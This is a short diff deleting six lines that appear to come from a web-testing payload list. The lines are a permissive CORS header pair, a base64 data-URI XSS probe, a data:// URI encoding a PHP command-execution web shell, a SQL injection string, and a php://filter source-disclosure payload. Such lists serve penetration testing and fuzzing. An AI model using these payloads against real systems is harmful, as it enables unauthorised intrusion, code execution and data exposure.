@@ -1,6 +1,0 @@
-Access-Control-Allow-Credentials: true
-Access-Control-Allow-Origin: *
-<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click Me</a>
-data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
-' OR 1=1 %00
-php://filter/convert.base64-encode/resource=index.php
